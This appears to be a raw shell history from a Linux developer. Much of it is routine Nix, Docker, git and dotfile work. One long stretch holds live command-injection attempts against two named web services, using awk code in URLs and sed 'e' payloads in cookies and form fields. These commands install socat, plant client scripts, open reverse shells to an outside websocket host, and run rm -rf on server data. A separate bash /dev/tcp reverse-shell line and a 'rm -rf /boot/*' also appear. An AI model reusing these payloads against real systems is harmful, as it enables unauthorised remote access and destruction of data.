curl --globoff 'https://cop.fish/profile/";}else%20if($1==88){print("\n\n\ntest\n\n\n");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if("tolower($2)"=="pop-eyed goldfish"){print("\n\n\ntest\n\n\n");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if("tolower($2)"=="pop-eyed%20goldfish"){print("\n\n\ntest\n\n\n");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){print("\n\n\ntest\n\n\n");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){shell("socat%20--version");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){shell("which%20socat");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){shell("sudo%20apt%20install%20socat");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){shell("which%20socat");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){print("\n\n\ntest\n\n\n");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){shell("which%20socat");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if(true){shell("which%20socat");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{shell("which%20socat");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){system("socat%20--version");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){system("which%20socat");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){system("apt%20install%20socat");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){system("apt%20install%20-y%20socat");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){system("socat%20--version");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){system("which%20socat");}if($3==0){print"'
socat -d -d file:`tty`,raw,echo=0 system:'websocat -s 0.0.0.0:8080'
bash
clear
socat -d file:(tty),raw system:"websocat -s 0.0.0.0:8080"
tty
socat -d file:$(tty),raw system:"websocat -s 0.0.0.0:8080"
ehcho (tty)
echo (tty)
socat -d file:'$(tty)',raw system:"websocat -s 0.0.0.0:8080"
socat -d file:'(tty)',raw system:'websocat -s 0.0.0.0:8080'
socat -d file: (tty) ,raw system:'websocat -s 0.0.0.0:8080'
socat -d file:$"($tty)",raw system:'websocat -s 0.0.0.0:8080'
socat -d file:$"(tty)",raw system:'websocat -s 0.0.0.0:8080'
echo $""
echo $"(tty)"
socat -d $"file:(tty)",raw system:'websocat -s 0.0.0.0:8080'
# socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
socat -d $"file:(tty),raw" system:'websocat -s 0.0.0.0:8080'
pkill socat
pkill websocat
pkill socat
pkill python
pkill socat
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
pkill socat
socat -d $"file:(tty),raw" system:'websocat -s 0.0.0.0:8081'
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
pkill socat
socat -d $"file:(tty),raw" system:'websocat -E -s 0.0.0.0:8081'
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
pkill socat
socat -d $"file:(tty),raw" system:'websocat -t -E -s 0.0.0.0:8081'
rlwrap
rlwrap -cAr websocat -t -E -s 0.0.0.0:8081
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
rlwrap websocat -s 0.0.0.0:8081
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
bash -i >& /dev/tcp/10.10.10.10/8080 0>&1
rcat listen 8080
clear
rcat listen 8080
bash -i >& /dev/tcp/10.10.10.10/8081 0>&1
rcat listen 8081
socat -d -d TCP-LISTEN:8080 STDOUT
socat -d -d TCP-LISTEN:8081 STDOUT
socat TCP-LISTEN:8081 STDOUT
bash
socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:8081
socat TCP:0.0.0.0:8081 EXEC:'bash',pty,stderr,setsid,sigint,sane
pkill socat
socat TCP:0.0.0.0:8081 EXEC:'bash',pty,stderr,setsid,sigint,sane
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
pkill socat
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -b -E ws://localhost:8081'
pkill socat
cloudflared tunnel run testing
nvim ~/.cloudflared/config.yml 
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){system("pkill%20bash");}if($3==0){print"'
cloudflared tunnel run testing
nvim ~/.cloudflared/config.yml 
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -b -E ws://testing.infinitecoder.org:8081'
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -b -E ws://0.0.0.0:8081'
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -b -E ws://testing.infinitecoder.org:8081'
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -b -E ws://testing.infinitecoder.org:8080'
echo s | awk (urldecode '{ print(sprintf("socat%20EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat%20-b%20-E%20ws:%25c%25ctesting.infinitecoder.org:8080'",47,47)); }')
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){system(sprintf("socat%20EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat%20-b%20-E%20ws:%25c%25ctesting.infinitecoder.org:8080'",47,47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){system(sprintf("socat%20EXEC:'bash',pty,stderr,setsid,sigint,sane%20SYSTEM:'websocat%20-b%20-E%20ws:%25c%25ctesting.infinitecoder.org:8080'",47,47));}if($3==0){print"'
bash -c socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -b -E ws://testing.infinitecoder.org:8080'
bash -c "socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -b -E ws://testing.infinitecoder.org:8080'"
echo s | awk (urldecode '{ print(sprintf("echo 'websocat -b -E ws:%25c%25ctesting.infinitecoder.org:8080' > client.sh",47,47)); }')
echo s | awk (urldecode '{ print(sprintf("echo%20'websocat%20-b%20-E%20ws:%25c%25ctesting.infinitecoder.org:8080'%20>%20client.sh",47,47)); }')
echo s | awk (urldecode '{ print(sprintf("bash%20-c%20\"echo%20'websocat%20-b%20-E%20ws:%25c%25ctesting.infinitecoder.org:8080'%20>%20client.sh\"",47,47)); }')
curl --globoff 'https://cop.fish/profile/";}else%20if($1==101){system(sprintf("bash%20-c%20\"echo%20'websocat%20-b%20-E%20ws:%25c%25ctesting.infinitecoder.org:8080'%20>%20client.sh\"",47,47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("cat%20client.sh",47,47));}if($3==0){print"'
bash
curl --globoff 'https://cop.fish/profile/";}else{system("socat%20EXEC:'bash',pty,stderr,setsid,sigint,sane%20SYSTEM:'bash%20client.sh'");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("ls");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("cat%20client.sh",47,47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("socat%20EXEC:'bash',pty,stderr,setsid,sigint,sane%20SYSTEM:'bash%20client.sh'");}if($3==0){print"'
pkill socat
bash
bash
touch '";system("ls");print"'
ls
touch '";system("ls %s");print"'
ls
basename abc/def:abc2/def2
echo "\0"
urldecode "%00" | urlencode
echo -e "\x0" | urlencode
bash
exit
bash
rm -rf `";system("ls %s");print"` `";system("ls");print"`
clear
bash
spectacle
stdbuf --help
zed
ext
exit
nix shell nixpkgs#zed
ls
fa-list
fonts
exit
ls
nix run nixpkgs#zed-editor
ls
ondsel-es 
cd Downloads/
clear
ls
git clone https://github.com/cgsdev0/bash-stack.git
z Down
ls
z bash-stack/
ls
z examples/jeopardy-buzzer/
ls
docker build
docker build jeopardy
docker build . -n jeopardy
docker --help
docker build --help
docker-compose
docker compose build bashstack 
docker compose up
docker compose attach bashstack 
docker compose attach caddy 
ls
cat Caddyfile 
cat docker-compose.yml 
ls
docker run
docker run bashstack
docker ls
docker container list 
docker compose ls 
docker compose images 
clear
docker build -t jeopardy .
docker run jeopardy
docker exec -it jeopardy bash
docker images 
docker image rm *
docker image rm advancedclimatesystems/docker-buildroot:
docker image rm jeopardy-buzzer-bashstack:
docker image rm jeopardy-buzzer-bashstack
docker image rm advancedclimatesystems/docker-buildroot
docker image rm aiden827/yolov8_onnx
docker image rm debian
docker image rm caddy
docker image rm python
docker image rm sickcodes/docker-osx
docker image rm voxel-engine
docker image rm yolov8
docker image rm advancedclimatesystems/docker-buildroot
docker image rm debian
docker image rm python
docker image rm --force *
docker image rm --force advancedclimatesystems/docker-buildroot
docker image rm --force debian
docker image rm --force python:
docker image rm --force python jeopardy sickcodes/docker-osx
clear
docker image list
docker image rm eeb27ee6b893
docker image rm 24862c7cf19f 2c9f5acc5a07 da405ec17e0d 0969f0b84ed3 4d54baf1c5e5 cb546cf0b52b d59ef0b31f53 4e84b544e8ba 43427e338890 215f216779c4 4d5da3951fc4 0768d28239b9 338f14ce07ba
docker image list
clear
docker build -t jeopardy .
docker exec -it jeopardy bash
docker run --help #-it jeopardy
docker run -it jeopardy bash
ls
bat docker-compose.yml 
ls
file core.sh 
cp ../../core.sh .
rm -rf core.sh
cp ../../core.sh .
docker run -it jeopardy bash
docker build -t jeopardy .
bash
curl https://jeopardy.bashsta.cc/sse/hacker/something/something
curl https://jeopardy.bashsta.cc/sse/hacker/../data/buzzed-
curl https://jeopardy.bashsta.cc/
# socat%20EXEC:'bash',pty,stderr,setsid,sigint,sane%20SYSTEM:'bash%20client.sh
nix run nixpkgs#zed-editor
cloudflared tunnel run testing
nvim ~/.cloudflared/config.yml 
ls
cd /mnt/Dev
ls
cd Tools/ls
cd Tools/
ls
mkdir revshell
cd revshell/
ls
echo "websocat -b -E -s 0.0.0.0:8080" > system.sh
;s
bash
flake-new
vim flake.nix
nvim revshell.sh
cat system.sh 
mv revshell.sh server.sh
ls
./server.sh
chmod +x server.sh
echo 'websocat -b -E ws://testing.infinitecoder.org:8080' > client.sh
z /mnt/Dev/Tools/revshell/
'websocat -b -E ws://testing.infinitecoder.org:8080' | save client.sh
ls
cat client.sh 
mv client.sh client-system.sh
l
"socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash client.sh'" | save client.sh
./client.sh
chmox +x client.sh
chmod +x client.sh
clear
./client.sh
ls
cat client-system.sh 
cat client.sh 
bash
ls
bash
exit
nix develop -c nu
nix develop
clear
nvim client-system.sh 
./client.sh
nvim client-system.sh 
./client.sh
cat client-system.sh 
cat client.sh 
docker run -it jeopardy bash
ls
bash
bash
zsh
clear
bash
z Down
clear
curl -H 'Content-Type: application/x-www-form-urlencoded' -d 'room_code=client-system.sh' -b 'username=websocat -b -E ws://testing.infinitecoder.org:8080' -s -D - -o /dev/null https://jeopardy.bashsta.cc/buzz
# /data/buzz-client-system.sh
USERNAME=="test//; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash data/buzz-client-system.sh'; s/"
USERNAME="test//; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash data/buzz-client-system.sh'; s/"
curl -H 'Content-Type: application/x-www-form-urlencoded' -d 'room_code=client-system.sh' -b "username=test//; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash data/buzz-client-system.sh'; s/" -b "room_code=revshell" -s -D - -o /dev/null https://jeopardy.bashsta.cc/buzz
curl -H 'Content-Type: application/x-www-form-urlencoded' -d 'room_code=client-system.sh' -b 'username=websocat -b -E ws://testing.infinitecoder.org:8080' -s -D - -o /dev/null https://jeopardy.bashsta.cc/buzz
curl -H 'Content-Type: application/x-www-form-urlencoded' -d "username=test//; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash data/buzz-client-system.sh'; s/" -d "room_code=revshell" -s -D - -o /dev/null https://jeopardy.bashsta.cc/buzz
curl -H 'Content-Type: application/x-www-form-urlencoded' -d "username=test//; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash data/buzzed-client-system.sh'; s/" -d "room_code=revshell" -s -D - -o /dev/null https://jeopardy.bashsta.cc/buzz
curl -H 'Content-Type: application/x-www-form-urlencoded' -d "username=test//; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash data/buzzed-client-system.sh'; s/" -d "room_code=revshell" -s -D - -o /dev/null https://jeopardy.bashsta.cc/score
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d "username=test//; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash data/buzzed-client-system.sh'; s/" -d "room_code=revshell" -s -D - -o /dev/null https://jeopardy.bashsta.cc/score
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -s -D - -o /dev/null https://jeopardy.bashsta.cc/score
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=infinite' -d 'amount=1' -d 'room_code=test' -s -D - -o /dev/null https://jeopardy.bashsta.cc/score
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=infinite' -d 'amount=1' -d 'room_code=test' -s -D - -o /dev/null https://jeopardy.bashsta.cc/score.html
curl -s -D - -o /dev/null https://jeopardy.bashsta.cc/score
curl -s -D https://jeopardy.bashsta.cc/score
curl -s -D - https://jeopardy.bashsta.cc/score
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=infinite' -d 'amount=1' -d 'room_code=test' -s -D - https://jeopardy.bashsta.cc/score
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d "username=test//; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash data/buzzed-client-system.sh'; s/" -d "room_code=revshell" -s -D - https://jeopardy.bashsta.cc/score
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d "username=test//; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash data/buzzed-client-system.sh'; s/" -d "room_code=revshell" -d "amount=1" -s -D - https://jeopardy.bashsta.cc/score
ls
ls | wc
ls | wc -n
ls | wc --help
ls | wc -l
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d "username=test//; e ls | wc -l'; s/" -d "room_code=revshell2" -d "amount=1" -s -D - https://jeopardy.bashsta.cc/score
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d "username=test//; e ls / | wc -l'; s/" -d "room_code=revshell2" -d "amount=1" -s -D - https://jeopardy.bashsta.cc/score
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d "username=test//; e ls / | wc -l'; s/" -d "room_code=revshell3" -d "amount=1" -s -D - https://jeopardy.bashsta.cc/score
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d "username=test%2F%2F%3B%20e%20socat%20EXEC%3A%27bash%27%2Cpty%2Cstderr%2Csetsid%2Csigint%2Csane%20SYSTEM%3A%27bash%20data%2Fbuzzed-client-system.sh%27%3B%20s%2F" -d "room_code=revshell" -d "amount=1" -s -D - https://jeopardy.bashsta.cc/score
bash
exit
nix develop -c nu
pkill socat
./server.sh
pkill socat
exi
exit
nix develop -c nu
clear
curl -b 'password=' -H 'Content-Type: application/x-www-form-urlencoded' -d "username=1//; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash data/buzzed-client-system.sh'; s/1/" -d "room_code=revshell5" -d "amount=1/; s" -s -D - https://jeopardy.bashsta.cc/score
curl -s -D - https://first.bashsta.cc/
curl -s -D - https://first.bashsta.cc/webhook
curl -s\ https://first.bashsta.cc/webhook
curl -s https://first.bashsta.cc/webhook
curl -D - https://first.bashsta.cc/webhook
curl --help
curl --help all
curl --help all | -s
curl --help all | grep -s
curl --help all | rg "-s"
curl --help all | rg "\-s"
curl --help all | rg "\\-s"
curl --help all | rg "\\-D"
clear
curl -D - https://first.bashsta.cc/webhook
curl -b "username=1/1/; e echo 'websocat -b -E ws://testing.infinitecoder.org:8080' > client-system.sh #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV2
curl -b "username=1/1/; e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash client-system.sh' #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV2S2
curl -b "username=1/1/; e echo 'websocat -b -E ws://testing.infinitecoder.org:8080' > client-system.sh #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV2
curl -b "username=1/1/%3b e echo 'websocat -b -E ws://testing.infinitecoder.org:8080' > client-system.sh #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV2
curl -b "username=1/1/%3b e echo 'websocat -b -E ws://testing.infinitecoder.org:8080' > client-system.sh #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash client-system.sh' #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e apt install -y socat && socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash client-system.sh' #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e echo test | publish room-revshellV3 #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshellV3 -type p) #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e bash \"apt install -y socat && socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash client-system.sh'\" | tee $(find pubsub/room-revshellV3 -type p) #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e cat client-system.sh | tee $(find pubsub/room-revshellV3 -type p) #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e echo \"socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'bash client-system.sh'\" > client.sh #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV2
curl -b "username=1/1/%3b e cat client.sh | tee $(find pubsub/room-revshellV3 -type p) #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e bash client.sh #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e ./client.sh #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e bash client.sh | tee $(find pubsub/room-revshellV3 -type p) #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e pkill tee #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e apt install socat #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e apt install -y socat #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e apt install -y build-essential libssl-dev pkg-config #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=InfiniteCoder01" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=InfiniteCoder01" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3c2
curl -b "username=1/1/%3b e bash \"ls\" | tee $(find pubsub/room-revshellV3c2 -type p) #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3
curl -b "username=1/1/%3b e bash \"ls\" | tee $(find pubsub/room-revshellV3c2 -type p) #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3c2
curl -b "username=1/1/%3b e bash \"ls | tee $(find pubsub/room-revshellV3c2 -type p)\" #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3c2
curl -b "username=1/1/%3b e bash \"ls | tee \\$(find pubsub/room-revshellV3c2 -type p)\" #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3c2
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshellV3c2 -type p) #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3c2
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshellV3c2 -type p)%3b e rm -rf data/room-revshellV3c2 #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV3c2
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshellV3c2 -type p) && rm -rf data/room-revshellV4 #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV4
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshellV3c2 -type p)%3b rm -rf data/room-revshellV4 #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV4
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshellV3c2 -type p)%3b rm data/room-revshellV4 #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV4
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshellV3c2 -type p) #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV4
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshellV4 -type p) && rm -rf data/room-revshellV4 #" -D - https://jeopardy.bashsta.cc/sse/player/revshellV4
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshell5 -type p) && rm -rf data/room-revshellV4 #" -D - https://jeopardy.bashsta.cc/sse/player/revshell5
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshell5 -type p) && rm -rf data/room-revshell5 #" -D - https://jeopardy.bashsta.cc/sse/player/revshell5
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshell5 -type p)%3b rm -rf data/room-revshell5 #" -D - https://jeopardy.bashsta.cc/sse/player/revshell5
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshell6 -type p)%3b rm -rf data/room-revshell6 #" -D - https://jeopardy.bashsta.cc/sse/player/revshell6
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshell6 -type p)%3b e rm -rf data/room-revshell6 #" -D - https://jeopardy.bashsta.cc/sse/player/revshell6
curl -b "username=1/1/%3b e echo test | tee $(find pubsub/room-revshell7 -type p)%3b e rm -rf data/room-revshell7 #" -D - https://jeopardy.bashsta.cc/sse/player/revshell7
sh
bash
ls
rm -rf `a 1 2 b`
rm -rf wc test.txt sed3sVkOv
ls
clear
exit
;s
ls
spectacle
ls
z DOwn
ls
cd bash-stack/examples/jeopardy-buzzer/
ls
cloudflared tunnel run testing
ls
basename (urldecode -a%09-z%09/%09..%09/%09test)
spectacle
bash
clear
nix run nixpkgs#lapce
ls
ls
clear
ls
nix run nixpkgs#zed-editor
clear
ls
./visualise.sh simple
cargo add raquote
cargo add raquote --package orco-visual
cargo add raqote --package orco-visual
cargo add font-kit --package orco-visual
clear
./visualise.sh simple
z verbose
flake-new
./visualise.sh simple
echo "use flake" | save .envrc; direnv allow
git add .
direnv reload
clear
./visualise.sh simple
nix run nixpkgs#lapce
ls --tree
nvim ~/.dotfiles/nushell/config.nu 
tree
exit
tree
tree -a
tree -l
clear
./run.sh
git mv content assets/
ls
git mv coders util/
git mv data util/
git mv interfaces util/
git mv items content/
git mv maths util/
git mv objects logic/
git mv physics util/
git mv voxels world/
git mv window graphics/
git mv files world/
git mv content assets/content/items
magic
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch
nvim ~/.dotfiles/system/packages.nix
gm
nix run nixpkgs#zed-editor
cargo tauri dev
clear
ls
cargo tauri dev
spectacle
git clone https://github.com/R0STUS/Voxel-Engine_DEBRIS.git
git clone "https://github.com/R0STUS/Voxel-Engine_DEBRIS.git" "/home/infinitecoder/Documents/finelauncher/instances/deb/game"
git clone "https://github.com/R0STUS/Voxel-Engine_DEBRIS.git" "/home/infinitecoder/Documents/finelauncher/instances/deb2/game"
git config --global http.postBuffer 4096M
git config --global http.postBuffer 1M
python main.py
python -m venv .
bin/pip install customtkinter
bin/python main.py
bin/pip install _tkinter
bin/pip install tkinter
bin/pip install tk
bin/python main.py
nix shell nixpkgs#pythonFull
nix shell "nixpkgs#python3FullERR"
python main.py 
python -m venv .
bin/pip install customtkinter
bin/python main.py
ls
cd
cd Downloads/
appimagetool v-creator_0.8.0_amd64.AppImage
nix run nixpkgs#appimage-run -- v-creator_0.8.0_amd64.AppImage
./Workshop_mod_linux64
exit
nix shell nixpkgs#libglvnd
./run.sh
cp ../../play-me/game/flake.nix .
nix develop -c nu
git add .
./Workshop_mod_linux64
bat flake.nix 
./Workshop_mod_linux64
nix run nixpkgs#nixGL -- Workshop_mod_linux64
nix develop -c nu
git clone https://github.com/clasher113/VoxelEngine-Cpp.git
ls
cd VoxelEngine-Cpp/
ls
pwd
ls
pwd
git add .
./run.sh
ls
git status
git checkout workshop
git branch --list
./run.sh
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch
nvim ~/.dotfiles/system/packages.nix
nix run nixpkgs#zed-editor
sudo nixos-rebuild switch
mv ~/.config/zed ~/.dotfiles/
ls ~/.config/zed
ls ~/.dotfiles
z .dot
ls
nvim install.conf.yaml 
clear
dotbot -c install.conf.yaml
clear
cat ./fetch.sh
./fetch.sh
dotbot -c install.conf.yaml
nix run nixpkgs#synfigstudio
nix run nixpkgs#opentoonz
export NIXPKGS_ALLOW_INSECURE=1
ENV.NIXPKGS_ALLOW_INSECURE=1
env.NIXPKGS_ALLOW_INSECURE=1
set env.NIXPKGS_ALLOW_INSECURE=1
$env.NIXPKGS_ALLOW_INSECURE = 1
./tupitube_0.2.22_linux_x64.sh
chmod +x ./tupitube_0.2.22_linux_x64.sh
./tupitube_0.2.22_linux_x64.sh
chmod +x setup 
./setup
cat setup 
/bin/env bash
/usr/bin/env bash
./setup
bin/tupitube.bin
nix run nixpkgs#opentoonz --impure
nix run nixpkgs#opentoonz --impure --offline 
pkill godo
pkill godot
nc
netcat
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch
nvim ~/.dotfiles/system/packages.nix
clear
nix run nixpkgs#zed-editor
z dot
ls
./fetch.sh
where ffplay
where ff-play
which ff-play
which ffplay
ls
cat path.sh 
dotbot -c install.conf.yaml
zed .dotfiles
zed --help
zed /home/infinitecoder/.dotfiles
# zed /home/infinitecoder/.dotfiles /home/infinitecoder/
zed --help
zed /home/infinitecoder/.dotfiles /home/infinitecoder/.dotfiles/fetch.sh:2:3
zed /home/infinitecoder/.dotfiles /home/infinitecoder/.dotfiles/fetch.sh
zed /home/infinitecoder/.dotfiles /home/infinitecoder/.dotfiles/fetch.sh:2
zed /home/infinitecoder/.dotfiles /home/infinitecoder/.dotfiles/fetch.sh:4
zed /home/infinitecoder/.dotfiles /home/infinitecoder/.dotfiles/fetch.sh:5
zed /home/infinitecoder/.dotfiles /home/infinitecoder/.dotfiles/fetch.sh:5:1
git clone https://gitlab.com/greenfox/better-processes.git
cat buildSystem.sh 
./buildSystem.sh
./buildSystem.sh --help
./buildSystem.sh -l
./buildSystem.sh -lr
./buildSystem.sh -r
ls target/
ls target/release
ls target/release/build
ls target/release/
ls target/release/x86_64-unknown-linux-gnu
ls target/release/x86_64-unknown-linux-gnu/
ls target/release/x86_64-unknown-linux-gnu
cp .git ../chatry
cp -r .git ../chatry
git status
git add .
git rm --cached addons/BetterProcesses
rm -rf addons/BetterProcesses/.git
git add .
git commit -m "Godot rewrite"
git push
git add .
git commit -m "Readme is back"
git push
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch
audacity 
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch
alias ls
echo $ls
nvim ~/.dotfiles/nushell/config.nu 
exit
exit
nvim ~/.dotfiles/nushell/config.nu 
eza
eza -i
eza --icons 
ls
l
nvim ~/.dotfiles/nushell/config.nu 
exit
nvim ~/.dotfiles/nushell/config.nu 
exit
nvim ~/.dotfiles/nushell/config.nu 
exit
nvim ~/.dotfiles/nushell/config.nu 
exit
tree
eza --help
nvim ~/.dotfiles/nushell/config.nu 
ls
exit
exit
nvim ~/.dotfiles/nushell/config.nu 
exit
ls ERR
nvim ~/.dotfiles/nushell/config.nu 
eza --help
exit
nvim ~/.dotfiles/nushell/config.nu 
exit
nvim ~/.dotfiles/nushell/config.nu 
exit
nvim ~/.dotfiles/nushell/config.nu 
exit
nvim ~/.dotfiles/nushell/config.nu 
scope aliases
shells
scope aliases
nvim ~/.dotfiles/nushell/config.nu 
exit
source eza
source aliases/eza
source eza-aliases
source eza-aliases.nu
nvim ~/.dotfiles/nushell/config.nu 
exit
exit
ls
xs
x
nvim ~/.dotfiles/nushell/config.nu 
exit
x 
xl
nvim ~/.dotfiles/nushell/config.nu 
exit
x
xxl
xl
xa
xla
xt 
xta
clear
sudo nixos-rebuild switch -j 1
unrar
nix shell nixpkgs#unrar
env.NIXPKGS_ALLOW_UNFREE = 1
$env.NIXPKGS_ALLOW_UNFREE = 1
unrar `Consequences of the Curse.rar`
unrar e `Consequences of the Curse.rar`
unrar `Consequences of the Curse.rar` CotC
unrar e `Consequences of the Curse.rar` CotC
mkdir CotC
unrar e `Consequences of the Curse.rar` CotC
unrar
unrar x `Consequences of the Curse.rar`
unrar x Continuum.rar
unrar x Писарьv1-2.rar
audacity
sudo nixos-rebuild --install-bootloader boot
reboot
nvim ~/.dotfiles/system/packages.nix
ls /boot
x /boot
rm -rf /boot/*
sudo nixos-rebuild --install-bootloader boot
sudo rm -rf /boot/*
x /boot
reboot
